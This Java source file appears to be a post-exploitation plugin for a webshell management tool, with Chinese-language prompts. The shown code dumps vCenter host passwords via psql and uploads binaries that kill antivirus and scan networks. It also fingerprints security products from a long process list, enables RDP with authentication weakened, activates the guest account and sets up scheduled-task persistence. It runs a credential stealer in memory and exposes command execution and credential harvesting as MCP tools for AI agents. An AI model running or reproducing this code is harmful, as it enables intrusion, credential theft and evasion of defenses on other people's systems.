        StringBuilder extracted = new StringBuilder();
        String usernameRegex = "username\\s*=\\s*(\\S+)";
        String passwordRegex = "password\\s*=\\s*(\\S+)";
        String jdbcUrl = extractJdbcUrl(config);
        this.vdbHostTextField.setText(extractHostFromJdbcUrl(jdbcUrl));
        this.vdbPortTextField.setText(String.valueOf(extractPortFromJdbcUrl(jdbcUrl)));
        this.vdbNameTextField.setText("VCDB");
        this.vdbUsernameTextField.setText(extractValue(config, usernameRegex));
        this.vdbPasswordTextField.setText(extractValue(config, passwordRegex));
        this.vexecSqlTextField.setText("PGPASSWORD=" + this.vdbPasswordTextField.getText() + " psql -h localhost -U vc -d VCDB -c 'select ip_address,user_name,password from vpx_host;' >password.enc");
        return extracted.toString();
    }

    public static String extractJdbcUrl(String inputString) {
        String regex = "jdbc:[a-zA-Z0-9+.-]+://[a-zA-Z0-9.-]+(:\\d+)?/[a-zA-Z0-9_-]+(?:\\?[^\\s]*)?";
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(inputString);
        return matcher.find() ? matcher.group() : null;
    }

    public static int extractPortFromJdbcUrl(String jdbcUrl) {
        String regex = "jdbc:[a-zA-Z0-9+.-]+://[a-zA-Z0-9.-]+:(\\d+)/";
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(jdbcUrl);
        return matcher.find() ? Integer.parseInt(matcher.group(1)) : -1;
    }

    public static String extractHostFromJdbcUrl(String jdbcUrl) {
        String regex = "jdbc:[a-zA-Z0-9+.-]+://([a-zA-Z0-9.-]+):\\d+/";
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(jdbcUrl);
        return matcher.find() ? matcher.group(1) : null;
    }

    public static String extractValue(String input, String regex) {
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(input);
        return matcher.find() ? matcher.group(1) : null;
    }

    private static String extractLineValue(String config, String key) {
        String[] var2 = config.split("\n");
        int var3 = var2.length;

        for(int var4 = 0; var4 < var3; ++var4) {
            String line = var2[var4];
            if (line.startsWith(key)) {
                String[] parts = line.split("=", 2);
                return parts[1].trim();
            }
        }

        return "未找到" + key;
    }

    private void killButtonClick(ActionEvent actionEvent) {
        (new Thread() {
            public void run() {
                NewCmd.this.cmdTextArea.setText("");
                String path = NewCmd.this.payload.currentDir();
                byte[] pe = functions.readInputStreamAutoClose(NewCmd.class.getResourceAsStream("assets/kill360.exe"));
                NewCmd.this.payload.uploadFile(path + "\\kill360.exe", pe);
                String txt = NewCmd.this.payload.execCommand(path + "\\kill360.exe");
                NewCmd.this.payload.deleteFile(path + "\\kill360.exe");
                NewCmd.this.cmdTextArea.setText(txt);
            }
        }).start();
    }

    private void netButtonClick(ActionEvent actionEvent) {
        (new Thread() {
            public void run() {
                NewCmd.this.cmdTextArea.setText("");
                String path = NewCmd.this.payload.currentDir();
                System.out.println(NewCmd.this.payload.getOsInfo());
                String code;
                byte[] pe;
                String txt2;
                if (NewCmd.this.payload.getOsInfo().contains("Windows")) {
                    code = GOptionPane.showInputDialog("这里填写你的udp监听的服务和端口,比如:127.0.0.1:8080\nnc使用方法 echo 1 | nc -lup 8080", "");
                    pe = functions.readInputStreamAutoClose(NewCmd.class.getResourceAsStream("assets/netscan.exe"));
                    NewCmd.this.payload.uploadFile(path + "\\netscan.exe", pe);
                    txt2 = NewCmd.this.payload.execCommand(path + "\\netscan.exe -h  " + code);
                    NewCmd.this.payload.deleteFile(path + "\\netscan.exe");
                    NewCmd.this.cmdTextArea.setText(txt2);
                }

                if (NewCmd.this.payload.getOsInfo().contains("Linux")) {
                    code = GOptionPane.showInputDialog("这里填写你的udp监听的服务和端口,比如:127.0.0.1:8080\nnc使用方法 echo 1 | nc -lup 8080", "");
                    pe = functions.readInputStreamAutoClose(NewCmd.class.getResourceAsStream("assets/netscan"));
                    NewCmd.this.payload.uploadFile(path + "/netscan", pe);
                    txt2 = NewCmd.this.payload.execCommand("chmod +x " + path + "/netscan");
                    String txt = NewCmd.this.payload.execCommand(path + "/netscan -h  " + code);
                    NewCmd.this.payload.deleteFile(path + "/netscan");
                    NewCmd.this.cmdTextArea.setText(txt);
                }

            }
        }).start();
    }

    private void runButtonClick(ActionEvent actionEvent) {
        String cmdPattern = "tasklist /svc";
        (new Thread() {
            public void run() {
                NewCmd.this.cmdTextArea.setText("");
                String cmdResult = NewCmd.this.payload.execCommand("tasklist /svc");
                String[] av = new String[]{"d_safe_manage.exe", "d盾", "d_manage.exe", "d盾", "pc.exe", "云锁客户端", "yunsuo_agent_service.exe", "云锁服务端", "yunsuo_agent_daemon.exe", "云锁服务端", "gov_defence_daemon.exe", "govdefence(网防g01)", "gov_defence_service.exe", "govdefence(网防g01)", "aliyundun.exe", "阿里云-云盾", "alisecguard.exe", "阿里云-云盾", "aliyundunupdate.exe", "阿里云-升级服务", "aliyun_assist_service.exe", "阿里云-云监控", "baradagent.exe", "腾讯云-安全监控组件", "sgagent.exe", "腾讯云-安全监控组件", "ydservice.exe", "腾讯云-云镜主机安全", "ydlive.exe", "腾讯云-云镜主机安全", "ydedr.exe", "腾讯云-云镜主机安全", "360websafe.exe", "360主机卫士", "qhsrv.exe", "360主机卫士", "qhwebshellguard.exe", "360主机卫士", "cloudhelper.exe", "安全狗", "safedogtray.exe", "安全狗", "safedogguardcenter.exe", "安全狗", "safedogupdatecenter.exe", "安全狗", "safedogsiteapache.exe", "网站安全狗(apache)", "safedogsiteiis.exe", "网站安全狗(iis)", "safedogserverui.exe", "服务器安全狗", "hws.exe", "护卫神·入侵防护系统", "hwsd.exe", "护卫神·入侵防护系统", "hws_ui.exe", "护卫神·入侵防护系统", "hwspanel.exe", "护卫神·入侵防护系统", "hipsdaemon.exe", "火绒安全软件", "hipstray.exe", "火绒安全软件", "hipslog.exe", "火绒安全软件", "hipsmain.exe", "火绒安全软件", "usysdiag.exe", "火绒安全软件", "wsctrl.exe", "火绒安全软件", "qqpcrtp.exe", "腾讯电脑管家", "qqpctray.exe", "腾讯电脑管家", "qqpcnetflow.exe", "腾讯电脑管家", "qqpcrealtimespeedup.exe", "腾讯电脑管家", "360sd.exe", "360杀毒", "360rp.exe", "360杀毒", "360safe.exe", "360安全卫士", "360tray.exe", "360实时保护", "liveupdate360.exe", "360更新程序", "zhudongfangyu.exe", "360主动防御", "360safebox.exe", "360保险箱主程序", "360skylarsvc.exe", "360天擎终端安全管理系统", "wdswfsafe.exe", "360杀毒-网盾", "QHActiveDefense.exe", "360国际版", "360EntMisc.exe", "360(奇安信)天擎", "360EntClient.exe", "天擎EDR Agent", "edr_sec_plan.exe", "深信服EDR Agent", "edr_monitor.exe", "深信服EDR Agent", "edr_agent.exe", "深信服EDR Agent", "ESCCControl.exe", "启明星辰天珣EDR Agent", "ESCC.exe", "启明星辰天珣EDR Agent", "ESAV.exe", "启明星辰天珣EDR Agent", "ESCCIndex.exe", "启明星辰天珣EDR Agent", "savmain.exe", "Sophos杀毒", "savprogress.exe", "Sophos杀毒", "Sophos UI.exe", "Sophos杀毒", "SophosCleanM.exe", "Sophos杀毒", "SophosFileScanner.exe", "Sophos杀毒", "SophosOsquery.exe", "Sophos杀毒", "SophosNtpService.exe", "Sophos杀毒", "SophosFS.exe", "Sophos File Scanner Service", "SophosHealth.exe", "Sophos Health Service", "SophosSafestore64.exe", "Sophos Safestore Service", "SEDService.exe", "Sophos Endpoint Defense Service", "ALsvc.exe", "Sophos AutoUpdate Service", "SophosCleanM64.exe", "Sophos Clean Service", "McsAgent.exe", "Sophos MCS Agent", "McsClient.exe", "Sophos MCS Client", "SSPService.exe", "Sophos System Protection Service", "swc_service.exe", "Sophos Web Control Service", "SophosFIMService.exe", "Sophos FIM", "sdcservice.exe", "Sophos Device Control Service", "mbam.exe", "malwarebytes杀毒", "mbamtray.exe", "malwarebytes杀毒", "mbamservice.exe", "malwarebytes杀毒", "tmbmsrv.exe", "pc-cillin趋势反病毒", "ntrtscan.exe", "pc-cillin趋势反病毒", "vstskmgr.exe", "mcafee(麦咖啡)", "mcshield.exe", "mcafee(麦咖啡)", "mfevtps.exe", "mcafee(麦咖啡)", "mfeann.exe", "mcafee(麦咖啡)", "tbmon.exe", "mcafee(麦咖啡)", "shstat.exe", "mcafee(麦咖啡)", "mctray.exe", "mcafee(麦咖啡)", "udaterui.exe", "mcafee(麦咖啡)", "naprdmgr.exe", "mcafee(麦咖啡)", "engineserver.exe", "mcafee(麦咖啡)", "frameworkservice.exe", "mcafee(麦咖啡)", "avk.exe", "gdata安全防护软件", "gdscan.exe", "gdata安全防护软件", "avkwctl.exe", "gdata安全防护软件", "avkcl.exe", "gdata安全防护软件", "avkproxy.exe", "gdata安全防护软件", "avkbackupservice.exe", "gdata安全防护软件", "ccevtmgr.exe", "symantec(赛门铁克)", "ccsetmgr.exe", "symantec(赛门铁克)", "ccsvchst.exe", "symantec(赛门铁克) 或 norton(诺顿杀毒)", "rtvscan.exe", "symantec(赛门铁克) 或 norton(诺顿杀毒)", "smc.exe", "symantec(赛门铁克)", "smcgui.exe", "symantec(赛门铁克)", "snac.exe", "symantec(赛门铁克)", "symcorpui.exe", "symantec(赛门铁克)", "msmpeng.exe", "windows defender", "nissrv.exe", "windows defender", "mssense.exe", "windows defender", "msseces.exe", "windows defender", "mpcmdrun.exe", "windows defender", "msascui.exe", "windows defender", "msascuil.exe", "windows defender", "securityhealthservice.exe", "windows defender", "smartscreen.exe", "windows defender smartscreen", "avp.exe", "kaspersky(卡巴斯基)", "kavfs.exe", "kaspersky(卡巴斯基)", "klnagent.exe", "kaspersky(卡巴斯基)", "kavtray.exe", "kaspersky(卡巴斯基)", "kavfswp.exe", "kaspersky(卡巴斯基)", "ekrn.exe", "eset nod32防毒", "egui.exe", "eset nod32防毒", "eshasrv.exe", "eset nod32防毒", "eguiproxy.exe", "eset nod32防毒", "avg.exe", "avg杀毒", "avgwdsvc.exe", "avg杀毒", "avastui.exe", "avast!5主程序", "ashdisp.exe", "avast网络安全", "clamtray.exe", "clemwin free antivirus", "clamscan.exe", "clemwin free antivirus", "avcenter.exe", "avira(小红伞)", "avguard.exe", "avira(小红伞)", "avgnt.exe", "avira(小红伞)", "bddownloader.exe", "百度卫士", "baidusafetray.exe", "百度卫士", "baiduansvx.exe", "百度卫士-主进程", "baidusd.exe", "百度杀毒-主程序", "baidusdsvc.exe", "百度杀毒-服务进程", "baidusdtray.exe", "百度杀毒-托盘进程", "f-prot.exe", "f-prot杀毒", "vba32lder.exe", "vb32杀毒", "k7tsecurity.exe", "k7杀毒", "iptray.exe", "immunet杀毒", "cmctrayicon.exe", "cmc杀毒", "bkavservice.exe", "bkav杀毒", "nspupsvc.exe", "nprotect杀毒", "a2guard.exe", "a-squared杀毒", "ad-watch.exe", "lavasoft杀毒", "unthreat.exe", "unthreat杀毒", "psafesystray.exe", "psafe反病毒", "patray.exe", "ahnlab安博士杀毒", "v3svc.exe", "ahnlab安博士v3杀毒", "cleaner8.exe", "the cleaner杀毒", "mongoosagui.exe", "mongoosa杀毒", "secenter.exe", "bitdefender杀毒", "ayagent.exe", "alyac韩国胶囊杀毒", "ksafe.exe", "金山卫士", "kvmonxp.exe", "江民杀毒", "ravmon.exe", "瑞星杀毒", "ravmond.exe", "瑞星杀毒", "kxescore.exe", "金山毒霸", "kupdata.exe", "金山毒霸", "kxetray.exe", "金山毒霸", "kwsprotect64.exe", "金山毒霸", "ksafetray.exe", "金山卫士", "knsdtray.exe", "可牛杀毒", "sbamsvc.exe", "vipre杀毒", "remupd.exe", "熊猫卫士杀毒", "spidernt.exe", "dr.web杀毒", "quhlpsvc.exe", "quickheal杀毒", "fsavgui.exe", "f-secure冰岛杀毒", "f-secure.exe", "f-secure冰岛杀毒", "arcatasksservice.exe", "arcavir杀毒", "vsserv.exe", "bitdefender比特梵德杀毒", "avwatchservice.exe", "virusfighter杀毒", "ns.exe", "norton诺顿杀毒", "ccapp.exe", "norton诺顿杀毒", "vptray.exe", "norton病毒防火墙-盾牌图标程序", "npfmntor.exe", "norton杀毒软件相关进程", "ccregvfy.exe", "norton杀毒软件自身完整性检查程序", "sndsrvc.exe", "symantec shared诺顿邮件防火墙软件", "spbbcsvc.exe", "symantec shared诺顿邮件防火墙软件", "symlcsvc.exe", "symantec shared诺顿邮件防火墙软件", "coranticontrolcenter32.exe", "coranti2012杀毒", "cksoftshiedantivirus4.exe", "shield antivirus杀毒", "spywareterminatorshield.exe", "spywareterminator杀毒", "usbkiller.exe", "u盘杀毒专家", "ast.exe", "超级巡警", "fortitray.exe", "飞塔", "gg.exe", "巨盾网游安全盾", "adam.exe", "绿鹰安全精灵", "kpfwtray.exe", "金山网镖", "beikesan.exe", "贝壳云安全", "parmor.exe", "木马克星", "iparmor.exe", "木马克星", "kswebshield.exe", "金山网盾", "trojanhunter.exe", "木马猎手", "webscanx.exe", "网络病毒克星", "ananwidget.exe", "墨者安全专家", "pfw.exe", "天网防火墙", "cfp.exe", "comodo科摩多", "mpmon.exe", "微点主动防御", "rfwmain.exe", "瑞星防火墙", "sphinx.exe", "sphinx防火墙", "vsmon.exe", "zonealarm防火墙", "fyfirewall.exe", "风云防火墙", "acs.exe", "outpost防火墙", "outpost.exe", "outpost防火墙"};

                for(int i = 0; i < av.length; ++i) {
                    int find = cmdResult.indexOf(av[i]);
                    if (find != -1) {
                        NewCmd.this.cmdTextArea.setText(NewCmd.this.cmdTextArea.getText() + "" + av[i] + "  -> " + av[i + 1] + "\n");
                    }
                }

                if (NewCmd.this.cmdTextArea.getText().equals("")) {
                NewCmd.this.cmdTextArea.setText("");
                }

            }
        }).start();
    }

    public static String extractNumber(String input) {
        Pattern pattern = Pattern.compile("\\d+");
        Matcher matcher = pattern.matcher(input);
        return matcher.find() ? matcher.group() : null;
    }

    private void rdpButtonClick(ActionEvent actionEvent) {
        (new Thread() {
            public void run() {
                NewCmd.this.cmdTextArea.setText("");
                try {
                    String deny = NewCmd.this.payload.execCommand("cmd.exe /c reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections");
                    String port = NewCmd.this.payload.execCommand("cmd.exe /c reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber");
                    String svc = NewCmd.this.payload.execCommand("cmd.exe /c sc query TermService");
                    NewCmd.this.cmdTextArea.setText((deny == null ? "" : deny) + "\n" + (port == null ? "" : port) + "\n" + (svc == null ? "" : svc));
                } catch (Exception var5) {
                    NewCmd.this.cmdTextArea.setText(String.valueOf(var5.getMessage()));
                }
            }
        }).start();
    }

    private void runrdpButtonClick(ActionEvent actionEvent) {
        (new Thread() {
            public void run() {
                NewCmd.this.cmdTextArea.setText("");
                String cmd = "cmd.exe /c "
                        + "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
                        + " & reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f"
                        + " & netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes"
                        + " & net start TermService";
                try {
                    String txt = NewCmd.this.payload.execCommand(cmd);
                    NewCmd.this.cmdTextArea.setText(txt == null ? "" : txt);
                } catch (Exception ex) {
                    NewCmd.this.cmdTextArea.setText(String.valueOf(ex.getMessage()));
                }
            }
        }).start();
    }

    private void stoprdpButtonClick(ActionEvent actionEvent) {
        (new Thread() {
            public void run() {
                NewCmd.this.cmdTextArea.setText("");
                String cmd = "cmd.exe /c "
                        + "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f"
                        + " & netsh advfirewall firewall set rule group=\"remote desktop\" new enable=No";
                try {
                    String text = NewCmd.this.payload.execCommand(cmd);
                    NewCmd.this.cmdTextArea.setText(text == null ? "" : text);
                } catch (Exception ex) {
                    NewCmd.this.cmdTextArea.setText(String.valueOf(ex.getMessage()));
                }
            }
        }).start();
    }

    private void guestButtonClick(ActionEvent actionEvent) {
        (new Thread() {
            public void run() {
                NewCmd.this.cmdTextArea.setText("");
                String text = NewCmd.this.payload.execCommand("cmd.exe /c net user guest /active:yes");
                NewCmd.this.cmdTextArea.setText(text);
            }
        }).start();
    }

    private void runButton2Click(ActionEvent actionEvent) {
        (new Thread() {
            public void run() {
                NewCmd.this.cmdTextArea.setText("");
                String path = GOptionPane.showInputDialog("exe 路径", "");
                String result = NewCmd.this.payload.execCommand("schtasks /create /sc minute /mo 60 /tn " + NewCmd.getUUID32() + " /tr " + path);
                NewCmd.this.cmdTextArea.setText(result);
            }
        }).start();
    }

    public static String getUUID32() {
        String uuid = UUID.randomUUID().toString().replace("-", "").toLowerCase();
        return uuid;
    }

    @McpTool(name = "exec", desc = "执行系统命令 (NewCmd 命令执行)", params = {
            @McpParam(name = "shellId", required = true, desc = "Shell ID"),
            @McpParam(name = "command", required = true, desc = "要执行的命令") })
    public String mcpExec(Map<String, Object> args) {
        String cmd = (String) args.get("command");
        if (cmd == null || cmd.trim().isEmpty()) return "缺少参数: command";
        if (this.payload == null) return "payload 未初始化";
        return this.payload.execCommand(cmd);
    }

    @McpTool(name = "info1", desc = "获取信息方法1: 收集主机凭据 (Pillager)", params = {
            @McpParam(name = "shellId", required = true, desc = "Shell ID") })
    public String mcpInfo1(Map<String, Object> args) {
        return runInfo("assets/Pillager.exe", (String)null);
    }

    @McpTool(name = "info2", desc = "获取信息方法2: 收集主机信息 (hunter)", params = {
            @McpParam(name = "shellId", required = true, desc = "Shell ID") })
    public String mcpInfo2(Map<String, Object> args) {
        return runInfo("assets/hunter.exe", "all");
    }

    private String runInfo(String asset, String runArgs) {
        if (this.shellEntity != null && this.shellEntity.getFrame() != null) {
            if (this.loader == null) {
                this.loader = this.getShellcodeLoader();
            }
            if (this.loader == null) return "未找到 ShellcodeLoader";
        }
        try {
            byte[] pe = functions.readInputStreamAutoClose(NewCmd.class.getResourceAsStream(asset));
            if (this.shellEntity != null && this.shellEntity.getFrame() != null) {
                byte[] result = this.loader.runNetPe(runArgs, pe);
                return this.encoding.Decoding(result);
            }
            // MCP 无 frame: TH_TOOLS 内存执行 (PE->shellcode 转换后, 无界面选择)
            String cn = this.payload.getClass().getName().contains("csharp") ? "shells.plugins.csharp.TH_TOOLS" : "shells.plugins.java.TH_TOOLS";
            TH_TOOLS thTools = (TH_TOOLS) Class.forName(cn).newInstance();
            thTools.init(this.shellEntity);
            byte[] result = thTools.runNetPe(runArgs, pe, 7000, new PrintStream(new ByteArrayOutputStream()));
            return Encoding.getEncoding(this.shellEntity).Decoding(result);
        } catch (Exception e) {
            java.io.StringWriter sw = new java.io.StringWriter();
            e.printStackTrace(new java.io.PrintWriter(sw));
            return "执行失败:\n" + sw.toString();
        }
    }

    protected ShellcodeLoader createLoader() {
        return null;
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = shellEntity.getPayloadModule();
        Encoding encoding = Encoding.getEncoding(shellEntity);
        String rootpath = getRootPath(this.payload.currentDir());
        this.pathTextField.setText(rootpath + "/opsMgrCenter/conf/config.properties");
        this.VpathTextField.setText("/etc/vmware-vpx/vcdb.properties");
        this.additionalLabel1.setText("c_password");
        this.additionalLabel2.setText("c_salt");
        automaticBindClick.bindJButtonClick(NewCmd.class, this, NewCmd.class, this);
    }

    public JPanel getView() {
        return this.panel;
    }

    protected abstract ShellcodeLoader getShellcodeLoader();
}
